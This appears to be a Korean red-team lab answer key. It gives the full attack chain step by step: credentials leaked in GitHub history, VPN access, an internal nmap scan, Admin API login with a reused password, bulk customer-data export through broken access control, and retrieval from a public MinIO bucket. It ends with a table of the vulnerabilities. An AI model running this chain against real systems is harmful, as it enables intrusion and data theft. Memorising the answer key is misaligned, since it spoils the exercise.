# 공격 체인 — 정답 루트

Red Team 시나리오 전체 흐름. GitHub credential 발견부터 데이터 탈취까지.

---

## 전체 흐름

```
① GitHub OSINT
② VPN credential 발견
③ VPN 접속
④ 내부망 포트 스캔
⑤ Admin API 발견
⑥ Admin 로그인
⑦ export API 발견
⑧ 대량 export
⑨ MinIO 저장
```

---

## ① GitHub OSINT

공개 레포지토리 탐색:
```
https://github.com/1242525/argos-firmware
```

Commits 탭 → 커밋 히스토리 탐색

---

## ② VPN credential 발견

### 낚시용 커밋 (실패)

`feature/firmware-admin-setup` 브랜치 → `config/firmware-admin.conf`:
```
VPN_USER=firmware-admin
VPN_PASS=FwAdm1n@2024!
MFA=enabled          ← MFA 있음 → VPN 접속 실패
```

### 정답 커밋 (성공)

master 브랜치 깊은 히스토리 → `.env.bak` 삭제 커밋:
```
VPN_HOST=vpn.argos-internal.com
VPN_USER=deploy-bot
VPN_PASS=d3pl0y-B0t@secure    ← MFA 없음 → VPN 접속 성공
ADMIN_URL=http://10.10.0.10/admin
ROLE=deploy
```

---

## ③ VPN 접속

`.ovpn` 파일 + credential로 접속:

```bash
# deploy-bot.ovpn 다운로드 후
sudo openvpn ~/deploy-bot.ovpn
# username: deploy-bot
# password: d3pl0y-B0t@secure
```

접속 성공 시:
```
Initialization Sequence Completed
ifconfig 10.8.0.6   ← 내부망 IP 할당
```

VPN 접속 로그에서 내부망 대역 확인:
```
PUSH: Received control message:
'PUSH_REPLY,route 10.10.0.0 255.255.0.0,...'
```

→ `10.10.0.0/16`이 내부망 대역임을 확인
→ 이 대역에 내부 서버들이 존재함을 유추

---

## ④ 내부망 포트 스캔

git log에서 `ADMIN_URL=http://10.10.0.10/admin` 힌트 확인.
VPN 로그에서 내부망 대역 `10.10.0.0/16` 확인.
실제 서비스가 어느 IP에 있는지는 스캔으로 찾아야 함.

```bash
# 내부망 전체에서 8001, 8080 포트 스캔
nmap -Pn -sT -p 8001,8080 --max-rtt-timeout 10s 10.10.0.0/16
```

결과에서 8001 open인 IP 발견:
```
10.10.3.2:8001 open  ← Admin API
10.10.5.2:8080 open  ← Jenkins
```

---

## ⑤ Admin API 구조 파악

```bash
# Swagger 확인
curl http://10.10.3.2:8001/docs

# 전체 엔드포인트 목록
curl http://10.10.3.2:8001/openapi.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for path in data['paths']:
    print(path)
"
```

발견된 주요 엔드포인트:
```
/auth/admin/login          ← 관리자 로그인
/admin/export/customers    ← 고객 데이터 export
/admin/export/devices      ← 디바이스 export
/admin/staff               ← 직원 계정 목록
```

---

## ⑥ Admin 로그인

GitHub에서 발견한 credential로 로그인 시도 (VPN과 동일한 비밀번호):

```bash
curl -X POST "http://10.10.3.2:8001/auth/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "deploy-bot", "password": "d3pl0y-B0t@secure"}' \
  --max-time 30
```

응답:
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "username": "deploy-bot",
  "role": "operator"
}
```

---

## ⑦ 권한 검증 미흡 확인

`operator` role로 export 가능. tenant_id 소유권 검증 없음.

---

## ⑧ 대량 export 수행

```bash
# 전체 고객 데이터 export (101건)
curl -X POST "http://10.10.3.2:8001/admin/export/customers" \
  -H "Authorization: Bearer {JWT}" \
  --max-time 120
```

응답:
```json
{
  "record_count": 101,
  "filename": "customers_20260517_114607.csv",
  "minio_url": "http://10.10.4.2:9000/exports/customers_20260517_114607.csv",
  "download_url": "/admin/export/download/customers_20260517_114607.csv"
}
```

파일 다운로드:
```bash
curl "http://10.10.3.2:8001/admin/export/download/customers_20260517_114607.csv" \
  -H "Authorization: Bearer {JWT}" \
  -o ~/customers.csv
```

---

## ⑨ MinIO 영구 보관

```bash
# VPN 접속 상태에서 MinIO 직접 접근 (인증 불필요 - public 버킷)
curl http://10.10.4.2:9000/exports/customers_20260517_114607.csv -o ~/customers.csv
```

URL만 알면 언제든 재접근 가능. VPN 재접속 후 바로 사용 가능.

---

## 취약점 요약

| 취약점 | 내용 |
|---|---|
| Credential GitHub 노출 | `.env.bak` 커밋 히스토리에 VPN 계정 정보 |
| VPN MFA 미적용 | deploy-bot 계정 MFA 없음 → credential만으로 접속 |
| 동일 비밀번호 사용 | VPN과 Admin API 동일 → 1개 탈취로 2개 시스템 접근 |
| Swagger 공개 | 인증 없이 전체 API 구조 노출 |
| OWASP A01 (Broken Access Control) | operator가 전체 테넌트 데이터 export 가능 |
| MinIO public 버킷 | Presigned URL 없이 영구 공개 URL |
| Download role 체크 없음 | viewer도 파일명만 알면 다운로드 가능 (export는 403인데 download는 통과) |

---

## 계정별 결과

| 계정 | VPN | Admin 로그인 | export |
|---|---|---|---|
| dev01 | 실패 (MFA) | X | X |
| dev02 | 실패 (MFA) | X | X |
| firmware-admin | 실패 (MFA) | O | O |
| ops-monitor | 성공 | O (viewer) | X (403) |
| **deploy-bot** | **성공** | **O (operator)** | **O ← 정답** |
